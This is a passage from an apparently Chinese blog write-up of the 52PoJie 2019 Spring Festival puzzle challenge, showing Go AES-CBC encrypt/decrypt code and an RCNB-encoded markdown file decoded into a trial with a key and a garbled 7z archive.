<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">nil</span>, err</span><br><span class="line">    &#125;</span><br><span class="line">    blockSize := block.BlockSize()</span><br><span class="line">    origData = PKCS5Padding(origData, blockSize)</span><br><span class="line">    blockMode := cipher.NewCBCEncrypter(block, key[:blockSize])</span><br><span class="line">    crypted := <span class="built_in">make</span>([]<span class="keyword">byte</span>, <span class="built_in">len</span>(origData))</span><br><span class="line">    blockMode.CryptBlocks(crypted, origData)</span><br><span class="line">    <span class="keyword">return</span> crypted, <span class="literal">nil</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">AesDecrypt</span><span class="params">(crypted, key []<span class="keyword">byte</span>)</span> <span class="params">([]<span class="keyword">byte</span>, error)</span></span> &#123;</span><br><span class="line">    block, err := aes.NewCipher(key)</span><br><span class="line">    <span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">nil</span>, err</span><br><span class="line">    &#125;</span><br><span class="line">    blockSize := block.BlockSize()</span><br><span class="line">    blockMode := cipher.NewCBCDecrypter(block, key[:blockSize])</span><br><span class="line">    origData := <span class="built_in">make</span>([]<span class="keyword">byte</span>, <span class="built_in">len</span>(crypted))</span><br><span class="line">    blockMode.CryptBlocks(origData, crypted)</span><br><span class="line">    origData = PKCS5UnPadding(origData)</span><br><span class="line">    <span class="keyword">return</span> origData, <span class="literal">nil</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">    uid := <span class="string">"351649"</span></span><br><span class="line">    h := sha1.New()</span><br><span class="line">    h.Write([]<span class="keyword">byte</span>(uid))</span><br><span class="line">    bs := h.Sum(<span class="literal">nil</span>)</span><br><span class="line">    <span class="keyword">var</span> aeskey = bs[<span class="number">0</span>:<span class="number">16</span>]</span><br><span class="line">    pass := []<span class="keyword">byte</span>(<span class="string">"HappyNewYearFrom52PoJie.Cn"</span>)</span><br><span class="line">    xpass, err := AesEncrypt(pass, aeskey)</span><br><span class="line">    <span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">        fmt.Println(err)</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line">    &#125;</span><br><span class="line">    pass64 := base64.StdEncoding.EncodeToString(xpass)</span><br><span class="line">    fmt.Printf(<span class="string">"åŠ å¯†å:%v\n"</span>,pass64)</span><br><span class="line">    bytesPass, err := base64.StdEncoding.DecodeString(pass64)</span><br><span class="line">    <span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">        fmt.Println(err)</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line">    &#125;</span><br><span class="line">    tpass, err := AesDecrypt(bytesPass, aeskey)</span><br><span class="line">    <span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">        fmt.Println(err)</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line">    &#125;</span><br><span class="line">    fmt.Printf(<span class="string">"è§£å¯†å:%s\n"</span>, tpass)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="ã€æ˜¥èŠ‚ã€‘è§£é¢˜é¢†çº¢åŒ…ä¹‹ç•ªå¤–ç¯‡"><a href="#ã€æ˜¥èŠ‚ã€‘è§£é¢˜é¢†çº¢åŒ…ä¹‹ç•ªå¤–ç¯‡" class="headerlink" title="ã€æ˜¥èŠ‚ã€‘è§£é¢˜é¢†çº¢åŒ…ä¹‹ç•ªå¤–ç¯‡"></a>ã€æ˜¥èŠ‚ã€‘è§£é¢˜é¢†çº¢åŒ…ä¹‹ç•ªå¤–ç¯‡</h1><p>ç•ªå¤–ç¯‡ä¸ªäººæ„Ÿè§‰åº”è¯¥ç®—æ˜¯ä¸€é“ctfé‡Œçš„miscé¢˜äº†ã€‚å‹ç¼©åŒ…é‡Œç»™äº†ä¸€ä¸ªå¤§éƒ¨åˆ†æ–‡å­—è¢«åŠ å¯†çš„mdæ–‡ä»¶ï¼š</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="section"># ÈÄ†Å…ÆƒÈ“Æ‡Å„ÆƒÈ’Ä‹ÆÃÉŒÃ‡Å„ÃŸÉŒÄ‰Å‡Æ…Å•Æ‡ÅƒbÈ’È¼ÈµÃŸÈ’Ä†ÈµÆÈ“Ä‰nÆÉŒÄ‡Ç¸ÃŸ</span></span><br><span class="line"></span><br><span class="line">Æ¦Ä‡ÆÆÈ“Ä‰nÆ…È“ÄÆÃÉŒÄ‡Ã‘bÈ’ÄŒÅƒbÈ’Ä‹Ã‘bÅ•Æ‡ÅƒÃ¾È’ÄŒNÆƒÈ’ÄˆÃ‘Æ„È“ÄŠÃ‘Æ„Å•Æ‡Å†ÃÈ“ÄÆÃÉŒÄ‡Ã‘bÈ’Ä‹ÆÃÅ˜cÇ¸ÃÈÄ†Å…BÆ¦ÄŠÈµÃ¾Å™Ã‡ÈµÆ…ÈÄ‹Å‡bÉŒcÅ„Ã¾È“ÄŒÅ‡ÆÅ•Æ‡NÆ€È’ÄŒÅƒBÉŒÄ‡Ã‘BÉŒÄ‹nÆ„È“ÄˆÆbÅ—Æ‡ÆÃÅ—ÄnBÅ•Æ‡nÃ¾È’È»ÅƒBÈ“Ä‰nÆ…È’ÄŒNÆ…È’ÆˆÅ‡Ã¾Å•ÄÈ ÃŸÅ•Æ‡ÅƒÆƒÅ™ÄÈ bÅ™Ä‹ÈµÆ€</span><br><span class="line"></span><br><span class="line">ÈÄNÆ„Å•Æ‡Å†ÆƒÉŒcÅ…Æ„ÉŒÄ‹nÃ¾Å•Æ‡Å‡ÆÈ“Æ‡Å„ÆÅ•Æ‡Å„Ã¾ÉŒcÅ„Æ„Å•Æ‡Å„Ã¾ÉŒCÅˆÆ€Æ¦È»ÆÆƒÅ•Æ‡Å„Ã¾ÉŒCÅˆÆ€ÈÄ‰Å†Ã¾Å—cÅ…Æ…È’ÄˆÃ‘Æ„È“ÄŠÇ¸Æ…È“ÄˆÈµÃ¾ÉŒÄ‡ÆÃŸÅ•Æ‡Å†ÃÈ’È»ÅƒÃ¾ÉŒCÅˆÆ€ÉŒÄ‡Ç¸bÈ’È¼Ç¹ÃŸÈ“ÄˆÆB</span><br><span class="line"></span><br><span class="line">[<span class="string">Æ¦Ä‰Å†ÆƒÅ–Ä‹Å…Ã¾Å•Æ‡Å…Æ€È’CÅ…Æ€È’ÆˆÅ‡Ã¾ÉŒcÅ…Æ„ÉŒÄ‰Å‡ÃŸÅ•Æ‡Å†ÃÈ“ÄÆÃÈ’ÆˆÅˆÃ¾Å•Æ‡Å„Ã¾È“Ä‰nÃ¾È“ÄŒÅ‡BÅ—cÅ…Æ…ÉŒÄ‡ÆÆÈ“Ä‡Å…ÆÅ•Æ‡Å†ÃÈ’È»ÅƒÃ¾ÉŒCÅˆÆ</span>](<span class="link">//rcnb.xyz</span>)</span><br><span class="line"></span><br><span class="line">Å™ÄŠÃ‘bÈ’Ä‰È Æ€ÉŒÄ‡Ã‘bÈ’Ä‹ÆÃÈ“Ä‡Å…ÆÉŒÆˆÈ ÆƒÅ•Æ‡ÅƒÃ¾È’È»ÅƒÃ¾È’ÄˆÆÃÈ‘Ã‡Ç¹Æ„ÉŒCÈ Æ„Æ¦È»Å‡Æ…ÉŒÄ‡ÆBÈÄnÃÅ—Ã‡Ã‘BÅ™ÄŠÃ‘bÉŒÄ†nÃ¾Å—Ã‡Ç¹b</span><br><span class="line"></span><br><span class="line">ÈÈ¼ÅƒÃŸÉŒÄ‡Ã‘bÅ•Æ‡Å†ÃÈ’È»ÅƒÆ„Å•Æ‡Å†ÃÉŒcÅ„Ã¾È’CÅ…bÅ•È»</span><br><span class="line"></span><br><span class="line">Å˜ÄˆÃ‘Æ€ÆÆ„Å˜È»Å–ÄŠÇ¸Æ€rcnÆƒÅˆÃŸÉÄ‰ÆÆ€RÄŒÅ†bRÃ‡rcnbrcnbrcnbÅ–ÄŠÆÆƒrcnbrcnbrcnbrÄŒNÃ¾È“Ä‰ÆÆnÆ…Å”Æ‡Å„ÃrÄ‡Ç¹ÆÈ“Ä†Ã‘Æ…Å”È¼Å•Ã‡ÆÆ…ÆÃŸÈCÅ…ÆÈÆ‡Å–Ä†ÅˆÆÉŒÆ‡ÈµÆƒÈ‘ÄˆÈ ÆƒNÆƒÆ¦ÄÆÆ„È“Ä‰Å•ÄŒÅˆÆƒÅ‡bÈÄ†È‘Ä‡nÆ…Å˜È¼ÈµÃŸÆÃŸRÄ†Ç¸Æ„ÉŒCÆBÈ‘ÄŠÅ…ÃÅ—ÄŠÉŒÈ¼ÅƒÃŸÅ‡ÆÅ”cÅ”ÆˆÇ¹ÃÈ ÆÉŒÄ†Å„Æ…ÉÄ‰ÆÃÅ–Ã‡ÉŒcÅ‡Æ…Å–Ä†nÃ¾Å„ÆÈ“ÄŒÅˆÆ„Å˜È»È“È»nÆƒÇ¸ÆÉŒCÈ’Ä‡ÈµÆÈµÆ„ÉŒCÅ…Æ…ÈÄÅƒÆ€Å™CÅ™Æ‡Å‡ÆÇ¸Ã¾Å™Ã‡ÆbÆ¦ÄŒnbRCÆÃŸÈÄ‡Ç¹ÆÅ”È»Å™È»Å†BÇ¹BÈ‘Ä‹Å—Ã‡ÆÆƒÈ BÉŒÄ†Ã‘ÆƒÅ•ÄÅ†ÆƒÈ“Æ‡Å„bÅ–ÄÃ‘bÉŒÄŠÅ—ÆˆÃ‘BRcÆÆÈ‘Æ‡Å„ÃÆ¦ÄŒÇ¹Æ€Ç¸Æ€Å˜cÅ˜È»nÆ…RCÅ†ÆƒÅ…Æ„ÈÄ‰NÃÅ˜ÄˆÃ‘Æ„Å•ÄÈÄ‡Ç¹bÅ‡ÃÈ“Ä‡Ç¹ÃŸÉŒÄˆÅ”È»ÅˆÆ€ÆbÈÃ‡rCÇ¹ÃÈ“È»ÅƒBÅ„Æ„ÉÄ‹Å„bÉŒÄŒÅ—Æ‡nÆ…ÈµÆ€Å—Ä‹Å†ÃŸRCÅ‡bÅ™ÄŒÅ™Ä‡Ã‘Æ€ÈÄŠÅƒbÇ¸Æ…ÉcÈ‘CÈµbÇ¸ÃŸÈ‘Æ‡È‘CÇ¹Æ…Å˜È»ÅƒÆƒÅ™Ä‹ÅƒÃ¾nÆ„RÄ‹Ç¹BrÆ‡Å„ÆƒÅ–ÄˆÈ‘Ä‰Å†bÆÆ…Æ¦Ä†rCÆÃÆ¦Ä†Ã‘BÅ†Æ„rÄ‡È‘Æ‡Ã‘Æ…Å„Æ„Æ¦Æ‡Å—Ä†nÆ€Å”Ä†È Æ„ÈÄ‡NÆ€Ã‘Æ…Æ¦È¼È“Ä‰Å‡Æ„ÈµÃŸÈ‘CÇ¹Æ„ÈÈ¼Å—Ä‡È ÆƒÅ…BÈ“CÈ ÆÅ”Ä‹ÆÃŸÅ™cÅ˜ÄÅ…bÆ¦ÄŠÆÆƒÉŒÄ‹ÆÆ€nÆÅ˜È»Ã‘bÅ–ÄÅ—CnÃ¾È’È»Ã‘Æ…NÃ¾Å™È¼rÆˆNÆÅ•Ä†ÆBÈÃ‡ÅˆÆ…ÈCÅƒÃŸÅ…Æ„rÄ‡ÆÆ€È“ÄŠÅ„ÆƒÅ–Æ‡Ç¸ÆÅ™Ä‹Å˜Ä‡ÅƒÆÅ˜È¼Ã‘Æ…È‘Ä‹ÈµÆ€ÅƒÃ¾rÆ‡ÅƒÃŸÅ•Ä‰rÄ‡NÃ¾È’È»ÆÆÉŒÆˆÈ bÆ¦ÄŠNÆ…Å”CÆÃŸÈ“ÄŒÅ„ÃÆ¦Ä‹Å‡bÅ–ÆˆÅ†ÆƒÅ–Ä‰ÈµÃ¾nÆƒÉÄ‰ÉŒÆˆÅˆÃÅ™ÄÇ¹BÈ bÅ•Ä‰Å™Ä‹Å„Ã¾Å†Æ„È‘Ã‡ÆÆÈ’cÅ˜Ä‰Ç¸Æ…ÅˆÆƒÈ’cÅ”ÄˆÅ„ÃŸÇ¹ÆÆ¦Ä‡È“È¼Ç¹ÆÃ‘ÆÆ¦CÈ‘Ä‹Å‡Æ„È“ÆˆnÆ„ÈµÆ„rcÅ˜ÄnÆƒÈµÃŸRÄÈ‘cNÆrÄŠNÆ…ÈÃ‡Å‡ÆÅ†ÆÈ’ÄnÆ€ÉŒÄŒÅˆbÉŒÄ†rÈ¼ÆÃÅ‡ÆƒÉŒCÅ™Ã‡nÃ¾ÅˆÆ…È’È¼ÆBÈ‘cÈÈ»nBÅˆÆÈ‘Ä‹È“cÈ bÇ¹Ã¾È‘Æ‡Ç¹ÆrÄˆÅ–ÆˆÅˆÆÅ—cÈµbÅˆÃ¾Å™È¼Æ¦ÄˆÅƒÆ…ÅˆÃŸÅ—cÅƒÆ€Æ¦ÄŠÅ”cÅ„ÃÅ–Ä‰È Æ…ÅƒÆÈ‘ÄŠÈÃ‡È Ã¾ÆÃÉŒÆ‡ÈµÆ…ÈÈ¼ÉÄ‰Ã‘BrÆ‡Å‡Æ…Å”ÄÆÃŸnÆ…Å—ÄˆÉÄ†ÈµÆ…Å–ÄŒÅ†bÅ–Ä†È ÃÈ’Ä‹Ã‘ÆƒÅ—Ä‹NÆƒÅ•È»ÅƒÃNÃÅ”ÄÅ•Ä†ÆÆƒNÆƒRÄŒÈÄ†Å†ÆÅƒÆ€Å™Ä‹ÅƒbÈ“ÄÆÆƒÈ‘cÅ”Ä†NÃ¾È‘ÄÈ bÅ—Ä†NÃ¾Å‡ÆÈ“ÄrÄÅƒÆ„È‘Ä‰nÃ¾Å…Ã¾È“È»Å™cÃ‘Æ„Å–Æ‡Ã‘ÃŸÈÄ†Å„bÅ…bÅ•ÄŠÅƒÃŸÅ•ÄŒÅ‡ÃÈ’cÃ‘ÆÈ‘Ä†Å˜Ã‡Å„ÆƒRÆˆÇ¸Æ…Å•cÈ bÅ†ÃÈ‘Ä‹RÆˆÅ‡Æ€ÈcÅˆÃ¾Å„ÃÆ¦ÄˆÉCÈ Æ€Ã‘BRÄ‰Ç¸ÆÅ—È¼È‘Æ‡nÆÈµÃŸÅ•Æ‡Å–Ä‹ÆÆ…Å™Æ‡Ç¹Ã¾Å‡Æ„Å–Ã‡È ÆƒRÄˆÇ¸Æ…Å•Æ‡Å†Ã¾Å”ÄŠÅ™ÆˆÅˆbÆÃŸrÆˆÅ•Ã‡Ç¸Ã¾ÅƒÃÈÄ†nbÈ‘Ä‰È‘È»Ç¸ÆƒÇ¹Æ€RÆ‡rÆˆNbnÆ„rÄ‹rÄ‰Å…BÆ¦cÅˆÃ¾RÄ‹ÅˆÆnBÅ—È¼Ã‘ÆÅ•Ä‹ÆÃŸÉÄˆÅ—Ä‡Å†Æ€Ç¹ÆÈ‘ÄˆÅ…Ã¾Å”Æ‡ÅˆÆ…Å—Æ‡rÄŠÇ¹Æ„Ç¸ÃŸÈ’ÆˆÇ¹ÃŸÅ•È»È BÅ”Ä‡ÆÃ¾Å”È»Ã‘BÈ“Ä†Ç¸ÃÈ‘Ä‹Å•Ä‰ÅƒÃ¾ÅƒÆ€Å˜cÅ™È»Ã‘BÅ…Æ€ÉŒÆˆÅ„Æ„Å”ÄŠÃ‘ÃÆ¦ÄˆÆÆƒÈ“È¼Å†ÆÅ˜È»nÆ„Å”Ä‡Å–Ä‹Ç¸Æ„Å…BÅ–Ã‡È“Ä‰Å…BÅˆÆ„ÈÈ¼Å–Ã‡Å†bÇ¹Æ…rÈ»Ã‘ÃÅ”ÄŒÅ…ÃŸÅ”ÄŠNÃ¾ÉŒÆ‡È ÃRÄ‰nÃ¾Å™ÄÅ•Ä‹NÃ¾È Ã¾Æ¦È¼È Æ…RÄ†Ã‘Æ„Å—Ä‡Å˜ÄÅƒÆ„Å–Ã‡Ã‘Æ„Ç¹bÈ‘Ä†Å–Ã‡Ç¹Ã¾ÆÆ„È“cÆÆRCÇ¸Æ„ÉÄ‡È’ÄŒNÆ…È“È»ÅˆÃÅ†BRÄ†ÆbÅ™Æ‡Å–cÈ bÅ™È»Å„Æ„Å—Ä†ÅƒÃÅƒBÆ¦Ä‰Å—ÄŠNÃ¾Å™ÄŠÅ†ÃŸÈ’Ä†È ÆÈ‘ÄŠÅ…BÈÆˆÈµBÇ¹ÆÅ™crÄ‰ÆbnÆ€Æ¦Ä‹Å˜È¼Ã‘Æ€È’Ã‡Å„ÆÅ—CÈ ÆÆÃŸrÄŠÇ¹Ã¾Å—È»ÅƒÆ€È’È»ÉÄ‹NÃŸÅ–Ä‰Ç¸ÃŸÅƒÃrÆ‡È’È¼È ÆƒÅ™Æ‡ÅƒÆƒNbÅ˜Ä‹Æ¦ÄŒÅˆÆ…Å”ÄŒnBÅ—ÄŒÆbÆÃŸÅ”È¼Å”ÄŠÈ Æ€nÆ…Å–Ä‹Å•ÄÅ‡Æ„Ç¹BÅ”CÅ™Ä‹Ç¹Æ…ÈÄŒÅˆÆ€ÆÆ€Å™ÄˆÅ–ÄŒÈµÃŸÅ„ÃÉŒCÇ¹ÆƒÅ”Ä‡È“Ä‹Ã‘Ã¾Å•È¼ÆÆ„È’cÅ„bÇ¹bÈ“ÆˆÆÆ…ÉŒÄ†È Æ„Å–Ä‡Ç¹BÅ–ÆˆÅ˜Ã‡ÆÆ…Æ¦Ä‰ÅƒÆÅƒÃŸÅ–Ä‰NÆƒÅ”Ä‰Ã‘Æ„Å–ÄˆÆÃ¾È‘ÄŒÈ‘ÄŒnBÅƒÆÅ”ÄŒnÆƒÈ’ÄˆÈ“ÄˆNBÇ¸ÃŸÈCÈ ÃŸÈÄÅ…bÉÄ‰ÆÃ¾Æ¦Ä‰rÈ»Å…BÅ‡ÃŸÈ’È»Ç¸ÆÅ˜È¼Å˜Ä‹Å„BÅˆbÅ˜ÄnÆ„Å˜Ã‡È’ÆˆÅ‡Æ…Ç¹ÃÅ™Ä‡ÈÄ‡Å…ÃÆ¦Ä‹Å‡Æ„Å‡bÉŒÆ‡Æ¦Æ‡Å„Æ€ÅˆÆrÄŒRÄŒÅ†bÈ‘Ã‡Å…ÃŸÈµÆ…Å™È¼Å–Ä†Ç¸Æ€Å”CÆÆ€Å†ÃÈ“Æ‡rÄŠÅ‡Ã¾ÅˆbÅ•Ã‡ÅƒÆ„Å”ÆˆÅ„ÃÅ˜ÄŒÈÄŠÆbÅ™È»Ç¹ÆƒÉŒÄŒÈ BÅ„Æ„È’Æ‡NÃ¾Å™ÄŠÉŒÄ‡Å†BÅ•È¼È ÆƒÅ–Æ‡ÅˆÃ¾Ã‘ÃŸÈ“È¼È‘ÄŒÃ‘Æ…nÆ„ÉÄ‰nÃÅ—cÅ˜ÆˆÅˆÃŸÈ“Ä‰ÈµÆ„È‘cNbÈ ÃŸÆ¦Ã‡Å…ÆƒÉÄˆÆ¦ÄŠnÆÅ–Ã‡Å…BÅ”cÅƒÆÅ„ÆÉŒÄ‹ÅˆÃÅ•Ä‰Æ¦CÅ†Æ…Æ¦È»ÈµÆ…È“Ã‡Ç¹ÆƒÈ“Ä†È ÆƒRÈ»ÅˆÆƒÅ™Ä‡Ç¸Æ€Å—ÆˆÇ¹ÃŸÅ™Ä‰ÅˆbÈÄŒÅ„ÆÉÄˆÅ‡ÃÃ‘ÃÅ˜Ä‡Å—Ã‡NbÅ—È»Ã‘ÃRÆˆÇ¸ÆƒÇ¹Æ€Å•È»RÄ‰ÆBÅ„Ã¾Å˜È»Å”Ä†ÆÆÅ†BÅ•È»NBRÄ‰Å†ÆƒÈ“ÄŒÆÆÈÄ‹Ã‘Æ€RÄŒÅ•ÆˆÅˆÆ€rÄÅ‡Æ…ÈÄŠÅ…ÃÆ¦È¼Ç¹ÆÅˆÆƒÈ“ÄŠnÃ¾Å™ÄˆÅ˜CnÃ¾È Æ€È’cÆÆƒÉŒÄ‡ÉŒÄŠÈµÆ…Å•Æ‡ÅˆÆƒnÆ„Å”ÄÅ„ÃRÄŒÅ™È¼Å„bÅ‡ÃŸÅ•ÄŠÅˆÃ¾Å˜CÇ¹bÅ”ÄˆnbÅ•ÄŠÅ„Ã¾È‘cÅƒÆ„Å”ÄˆÅ”ÄÅ„bÈÄÈ BÅ™Ä‰Å…ÆƒÅ†ÆƒÅ˜ÆˆÉŒÃ‡Ã‘ÃÅ‡Æ„È“Ä‰ÉÄ‹ÅˆÆ…Å„Ã¾Å—CÅ™ÄŒÆÆ„RCÅ†ÃÆÆÅ”ÄˆRÈ¼NÆ…È’CnÆƒÉŒÆ‡Ç¹ÃŸÅ„ÃÅ•ÆˆÅ‡BÅ˜CÅ•È¼Ã‘BÈ’Ã‡ÅƒÃÇ¸ÆÈ“È¼Å•ÄŒÈ Ã¾ÈµÆÈ‘ÆˆÅ„Æ€Å”cÈ‘Æ‡Ã‘ÃŸrÆˆÇ¸ÃrcÅƒÃÅ‡Æ…È“Ä‡ÉŒÄ‡Å„Æ€ÉÄ‡ÅˆÆ€È Æ…Å˜È¼Ç¸ÆÉÄŠÅ™ÄÆÃÅ†ÆƒrÄŠÇ¸Æ€Å—cÈ“ÆˆÅ„Æ€Å‡Æ€ÈcrÄŠÅ…BÈ“ÄˆÈ ÆÉÄ‡nÆnÃÉŒÆ‡Ã‘ÆƒÈÈ¼ÆÃŸÅ”CÉÄ‡ÆbÆBÈ’cÅ†ÆrÄ‹nBÅ—ÆˆÈ“È»Å„ÆƒÉŒCÃ‘BÆÆ€È’ÄŒÅˆÃŸÅ”Æ‡Å™Æ‡Ç¹bÅ–cÅ†ÆƒÅ•Ä†ÅˆÃ¾Å•ÄŒÅ†Æ…È’Ä‰Å‡Æ…ÈÄˆÅ‡ÆÈ ÆƒRÄ‰Å”Æ‡Ç¸Ã¾Å˜ÄŠÈµÃŸÅ”È¼Å„bÈ‘ÆˆÈ BÇ¹BÉŒÄÈµÆƒrÄÇ¹Æ„Å”È»ÆÆ…Å—È¼È’Ä†ÆÆ€Å–Ä‰ÈµbÅ•cÆÃÈ’È¼Å„BrÄ‹Ç¸Æ…Å˜cÈ ÃÈÄÆbÈ“ÄŠÅ…bÅ˜CÈ Æ€ÉÄ†È Æ…Å•Ä‰NÆ€È ÃÅ–Ä‡Å™Ä‹Å„ÆÅ„Ã¾È“Ä‰È ÆÆ¦È»nÆ€È“Ã‡ÉÄˆÅ…Æ…Ç¸Æ€È“ÄÈ’È»Å†Æ€Ç¹ÃÉcÈ‘Ä†ÈµÆƒrÈ»ÆÆ€ÉŒCÅƒÃ¾ÉÄˆÈµÃ¾Å–ÄŒÅ†ÃŸÅˆÆ…Å—Ä‰Ã‘ÃÅ•ÆˆÈ‘cÅƒÆÇ¸ÃŸÈ’Æ‡ÈÃ‡ÆÃŸÅ„bÅ•ÆˆÈµBÅ•Æ‡nÆ„È“Ä‹È‘È¼È BÉÄ‹Å…ÃÅ—Ä‹Å…ÆƒÆ¦ÄÅ„Æ„ÅˆÃRÃ‡rcÅ…Æ„ÈÃ‡È ÃÅ™ÄÈ ÃÆBÉŒÈ¼ÉÄˆÅ‡Ã¾ÉÄ‰Ã‘Æ…Ç¸BrÄ†ÅˆÆƒÅ–È»Å•ÄÈµbÅ†ÃŸÅ˜ÄŠÆÆ€ÈÆˆnÃ¾Å˜ÄÈ“È»Ã‘ÃÅ•cÅ„Ã¾Å†bÅ”È¼ÉŒÄŒÃ‘BÉŒÄÈµbÈ‘ÄˆÅ…BÅ•Ä‰ÆÆ„Ã‘Ã¾È’Ã‡È“È»NÆ€Ã‘ÃŸÅ˜ÄˆÃ‘Æ€ÈÈ¼ÆBÅ”ÄˆÈµÃ¾ÉÄŠÃ‘ÃŸÅ•Ä‰È’È¼nÃ¾Å•Ã‡Å†bÅ„Ã¾ÉÄ†Å…ÃÅ—ÄŠÅƒÆƒRÄ‹Å†Æ…Å˜cNÃ¾È‘Ä†Å…ÆrÆˆÇ¸Æ„È’CÆÃ¾Å–È»rÃ‡Å‡bÅ™ÄŠÅ…Æ…È‘ÆˆÅƒBÆ¦Ä‹nÃŸÅˆÆ…Æ¦Ä‰Ã‘Ã¾È“ÄˆÅ™È¼ÅƒÆ€ÉcÅƒÆ„ÈµÃ¾ÉŒCÅ™Ä†NÆ„Ç¹Æ„Æ¦È»Å”ÄÅ…ÆƒnÆ…rÄ‹rCÇ¸Æ„È“ÆˆÅƒÆ€rÃ‡nÆrCÃ‘Æ…rCÈµÆ€rÆˆÇ¹ÃŸrÆˆÈµÆRÄ†ÆÆrÃ‡Å‡ÃÈµÃŸÆ¦ÄŒÈ‘È¼Ç¸ÆÇ¹BÈ‘cÉŒÆˆÆÃÈ’Ä†Å…ÃrÄ†ÅˆÆƒRÄ‡Å‡ÆÈ Æ…È“crc</span><br></pre></td></tr></table></figure><p>è¿™é‡Œç»™äº†ä¸€ä¸ªç½‘ç«™ï¼Œä¸Šé¢å¯ä»¥è§£å¯†ï¼Œå¾—åˆ°æ˜æ–‡mdæ–‡ä»¶ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"># Prove your Niubility</span><br><span class="line"></span><br><span class="line">Hello there, Welcome to the 52PoJiE Spring Festival 2019 Challenge - RCNB.</span><br><span class="line"></span><br><span class="line">To prove you are as NB as RC, complete this trial!</span><br><span class="line"></span><br><span class="line">[It&apos;s dangerous to go alone, take this!](//rcnb.xyz)</span><br><span class="line"></span><br><span class="line">And the key: Which_is_N0t_Th3_Answ3r</span><br><span class="line"></span><br><span class="line">With the trial:</span><br><span class="line"></span><br><span class="line">7zï¿½ï¿½&apos;ï¿½Gï¿½Ö&apos;ï¿½lÃ—vï¿½ï¿½ï¿½ï¿½2!ï¿½ï¿½ï¿½!$ï¿½xï¿½Zï¿½Ë¤ï¿½XĞ‚Yï¿½=ï¿½ï¿½Wï¿½Kï¿½Ã¯ï¿½zï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½rï¿½$]ï¿½Iï¿½ï¿½qï¿½Ibï¿½ï¿½iÔï¿½2Cï¿½ï¿½ï¿½Zï¿½`ï¿½3ï¿½ï¿½EWï¿½w3Xï¿½ï¿½</span><br><span class="line">                                                                                            ïŠ¨ï¿½ï¿½*2ï¿½&apos;]ï¿½Kzï¿½,&lt;`ï¿½ï¿½5ï¿½&amp;ï¿½</span><br><span class="line">QTï¿½~ï¿½zï¿½rq+ï¿½Iï¿½1Ô°ï¿½ï¿½ï¿½ï¿½r?ï¿½Rï¿½ï¿½ï¿½Yï¿½5Xï¿½&lt;rAï¿½ï¿½ï¿½Uï¿½ï¿½[ï¿½ï¿½ï¿½Gï¿½ï¿½^*ï¿½O- GPï¿½ï¿½ï¿½lï¿½ï¿½</span><br><span class="line">ï¿½ï¿½.:ï¿½7ï¿½3ï¿½ï¿½:*J(vï¿½ï¿½]ï¿½ï¿½,ï¿½hï¿½ï¿½ï¿½ï¿½nOËï¿½ï¿½Xï¿½&amp;ï¿½6ï¿½=Z\ï¿½ï¿½ï¿½ï¿½gï¿½hï¿½y6Iï¿½ï¿½nNJï¿½)ï¿½&amp;ï¿½ï¿½ï¿½yCEï¿½ï¿½Aï¿½ï¿½#ï¿½</span><br><span class="line">                                                                          8ï¿½ï¿½Èr&apos;ï¿½M\?oï€‘:ï¿½ï¿½Wï¿½ï¿½Vaï¿½)ï¿½ï¿½ï¿½ï¿½Dï¿½ï¿½.ï¿½5Vï¿½ï¿½Giï¿½ï¿½Aï¿½ï¿½)ï¿½,~ï¿½HÂ¬?ï¿½ï¿½ï¿½&amp;ï¿½ï¿½Vï¿½ï¿½ï¿½ï¿½ï¿½~_;ï¿½P|ï¿½(</span><br><span class="line">$ï¿½e00&quot;ï¿½ï¿½èˆ&#123;ï¿½ï¿½ï¿½ï¿½ï¿½8ï¿½]ï¿½-1ï¿½ï¿½_Zï¿½ï¿½G=ï¿½)oPdï¿½</span><br><span class="line">ï¿½)ï¿½ï¿½ï¿½w;ï¿½ï¿½ï¿½ï¿½8zOiï¿½ï¿½|&amp;ï¿½ï¿½ï¿½]Ã ï¿½&apos;ï¿½Cï¿½qï¿½ï¿½ï¿½ï¿½ï¿½SD&gt;ï¿½ï¿½!ï¿½ï¿½bï¿½ï¿½_ï¿½ |ï¿½Fï¿½</span><br><span class="line">-ï¿½&apos;ï¿½ï¿½ï¿½ï¿½-ï¿½Ú·ï¿½ï¿½ï¿½ç•¢&#123;ï¿½Ù™ï¿½ï¿½ï¿½tiï¿½ï¿½Eï¿½ï¿½Ş•;ï¿½ï¿½</span><br><span 